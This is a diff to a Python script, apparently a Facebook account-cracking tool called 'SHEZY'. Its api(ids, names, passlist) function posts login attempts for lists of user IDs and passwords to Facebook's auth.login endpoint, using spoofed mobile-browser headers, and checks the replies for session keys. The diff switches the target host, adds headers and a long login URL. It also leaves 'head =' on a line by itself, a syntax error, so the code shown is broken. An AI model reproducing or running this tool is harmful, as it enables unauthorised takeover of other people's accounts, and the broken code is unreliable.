@@ -76,11 +76,11 @@ logo = ("""
  
 
    \x1b[1;92m╔\033[1;91mKST\033[1;92m═══════════════════════\033[1;91mKST\033[1;92m╗
-   \x1b[1;92m║➣TOOL NAME : SHEZY      ║
-   \x1b[1;92m║➣AUTHOR    : XD         ║
-   \x1b[1;92m║➣TOOLS     : NEW UPDATE     ║
-   \x1b[1;92m║➣FACEBOOK  : Shezy Malik         ║
-   \x1b[1;92m║➣Group     : SAJJAD & NADIR🥀❤️║
+   \x1b[1;92m║➣TOOL NAME : SHEZY         ║
+   \x1b[1;92m║➣AUTHOR    : XD            ║
+   \x1b[1;92m║➣TOOLS     : NEW UPDATE      ║
+   \x1b[1;92m║➣FACEBOOK  : Shezy Malik      ║
+   \x1b[1;92m║➣Group     : SAJJAD & NADIR❤️║
    \x1b[1;92m║➣Stetus    : FREE            ║
    \x1b[1;92m╚\033[1;91mKST\033[1;92m═══════════════════════\033[1;91mKST\033[1;92m╝""")
 
@@ -552,8 +552,9 @@ def api(ids,names,passlist):
                                         "method": "auth.login",
                                         "fb_api_req_friendly_name": "authenticate",
                                         "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
-                                head = {
-    'authority': 'x.facebook.com',
+                                head = 
+                                {
+    'authority': 'm.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
     'cache-control': 'max-age=0',
@@ -565,12 +566,13 @@ def api(ids,names,passlist):
     'sec-ch-ua-platform-version': '"11.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
+    'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
     'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
+    'viewport-width': '980',
 }
-                                url = 'https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
+                                url = 'https://m.facebook.com/login/?ref=dbl&fl&login_from_aymh=1&rtime=1687444204&subno_key=AaFnnwfm_xUGfR-qbIbxy_x7DLFo2sZTGHIYlk8J8vMS6r5r9x47PKXEGFECCKaYLrqhNY1JKsX1tm0cWQJq-IpI4RY44h9AFaUZ_LGRRKY7OP_WWURbIMaj_eQ-VJC2moonUcqrH0SOZVPD3pb3HTSNvRpWu1FGhzLax-unl__iv77bP2jGvrBU9wXlbpJ876e3crbPZmXrS-lVaFN7sxn7KlJh2iJhl95QoULAk8ROmSZKCaa086k29kXidnjDhccwFqD00aW2x2fmP3f9-Fu-EUZNROyL0Vs6-9nDBsD955rZLqveYgvctzLRfiEWRUY&hrc=1&wtsid=rdr_0RPemrbSoLPVEuZLn&refsrc=deprecated&_rdr',
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
